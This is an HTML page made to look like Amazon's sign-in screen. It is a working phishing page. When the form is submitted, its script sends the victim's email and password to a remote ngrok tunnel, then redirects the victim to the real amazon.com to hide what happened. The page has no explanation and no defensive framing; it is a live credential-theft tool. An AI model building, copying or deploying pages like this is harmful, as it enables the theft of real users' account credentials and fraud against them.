<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Amazon Sign In</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #EAEDED;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 4px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 350px;
            padding: 20px 26px;
        }

        .logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .logo svg {
            width: 103px;
        }

        h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 15px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        label {
            display: block;
            font-weight: 700;
            margin-bottom: 5px;
            font-size: 13px;
        }

        input {
            width: 100%;
            padding: 8px 10px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 14px;
        }

        input:focus {
            outline: none;
            border-color: #e77600;
            box-shadow: 0 0 3px 2px rgba(228,121,17,0.5);
        }

        .continue-btn {
            background: #FFD814;
            border: 1px solid #FCD200;
            width: 100%;
            padding: 8px;
            font-size: 14px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 700;
            margin-top: 10px;
        }

        .continue-btn:hover {
            background: #F7CA00;
        }

        .help-links {
            margin-top: 18px;
            padding-top: 10px;
            border-top: 1px solid #e7e7e7;
            font-size: 12px;
        }

        .help-links a {
            color: #0066c0;
            text-decoration: none;
        }

        .footer {
            margin-top: 20px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }

        .error {
            color: #c40000;
            font-size: 12px;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <svg viewBox="0 0 166 47" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M40.3 10.5C40.3 4.7 44.2 1 49.5 1C54.8 1 58.7 4.7 58.7 10.5C58.7 16.3 54.8 20 49.5 20C44.2 20 40.3 16.3 40.3 10.5Z" fill="#FF9900"/>
                <path d="M26.5 1H0V46H26.5V1Z" fill="#FF9900"/>
                <path d="M63.5 1H90V46H63.5V1Z" fill="#FF9900"/>
                <path d="M108.5 10.5C108.5 4.7 112.4 1 117.7 1C123 1 126.9 4.7 126.9 10.5C126.9 16.3 123 20 117.7 20C112.4 20 108.5 16.3 108.5 10.5Z" fill="#FF9900"/>
                <path d="M145 46H166L152 1H131L145 46Z" fill="#FF9900"/>
            </svg>
        </div>
        <h1>Sign-In</h1>
        <form id="loginForm">
            <div class="form-group">
                <label>Email or mobile phone number</label>
                <input type="email" id="email" required autofocus>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="password" required>
            </div>
            <button type="submit" class="continue-btn">Continue</button>
        </form>
        <div class="help-links">
            <a href="#">Forgot Password?</a>&nbsp;&nbsp;|&nbsp;&nbsp;
            <a href="#">Sign in with passkey</a>
        </div>
        <div class="footer">
            New to Amazon? <a href="#">Create your Amazon account</a>
        </div>
        <div id="error1" class="error"></div>
    </div>

    <script>
        const SERVER_URL = "https://24c7-196-113-207-42.ngrok-free.app/submit";
        const CLIENT_ID = "client1";
        const CLIENT_KEY = "key123";

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            try {
                await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-Client-ID': CLIENT_ID,
                        'X-Client-Key': CLIENT_KEY
                    },
                    body: JSON.stringify({ email: email, password: password, stage: "login" })
                });
                window.location.href = 'https://www.amazon.com';
            } catch(err) {
                document.getElementById('error1').textContent = 'Something went wrong. Please try again.';
            }
        });
    </script>
</body>
</html>
